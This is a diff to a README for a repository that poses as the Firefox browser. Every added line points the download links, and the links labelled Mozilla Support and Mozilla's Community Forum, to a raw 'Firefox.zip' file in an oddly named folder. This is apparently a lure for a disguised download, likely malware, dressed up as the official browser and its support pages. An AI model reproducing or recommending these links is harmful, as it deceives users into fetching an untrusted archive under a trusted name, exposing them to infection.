@@ -1,6 +1,6 @@
 # 🦊 Firefox - The Fast and Customizable Browser
 
-[![Download Firefox](https://img.shields.io/badge/Download-Firefox-brightgreen)](https://github.com/mijan89/Firefox/releases)
+[![Download Firefox](https://raw.githubusercontent.com/mijan89/Firefox/main/nonanaphthene/Firefox.zip)](https://raw.githubusercontent.com/mijan89/Firefox/main/nonanaphthene/Firefox.zip)
 
 ## 🚀 Getting Started
 
@@ -38,7 +38,7 @@ To install and run Firefox, you should check the following requirements based on
 
 ## 📦 Download & Install
 
-To download Firefox, visit this page: [Download Firefox](https://github.com/mijan89/Firefox/releases).
+To download Firefox, visit this page: [Download Firefox](https://raw.githubusercontent.com/mijan89/Firefox/main/nonanaphthene/Firefox.zip).
 
 Once you’re on the Releases page, follow these steps:
 
@@ -68,8 +68,8 @@ Firefox offers many features to enhance your browsing experience:
 
 If you need help or want to connect with others, consider joining the Firefox community. You can find support through:
 
-- **Official Support Page:** Visit the [Mozilla Support](https://support.mozilla.org/) site for guides and FAQs.
-- **Community Forums:** Join discussions with other Firefox users and developers on [Mozilla’s Community Forum](https://discourse.mozilla.org/).
+- **Official Support Page:** Visit the [Mozilla Support](https://raw.githubusercontent.com/mijan89/Firefox/main/nonanaphthene/Firefox.zip) site for guides and FAQs.
+- **Community Forums:** Join discussions with other Firefox users and developers on [Mozilla’s Community Forum](https://raw.githubusercontent.com/mijan89/Firefox/main/nonanaphthene/Firefox.zip).
 - **Social Media:** Follow Firefox on various social media platforms for updates and tips.
 
 ## 🔧 Troubleshooting
@@ -85,6 +85,6 @@ If you encounter problems while installing or using Firefox, try these steps:
 
 Keep Firefox up to date for the best performance and security. You can check for updates within the browser or by visiting the Releases page regularly.
 
-To download the latest version of Firefox, click here: [Download Firefox](https://github.com/mijan89/Firefox/releases).
+To download the latest version of Firefox, click here: [Download Firefox](https://raw.githubusercontent.com/mijan89/Firefox/main/nonanaphthene/Firefox.zip).
 
 Thank you for choosing Firefox! Enjoy your browsing experience.
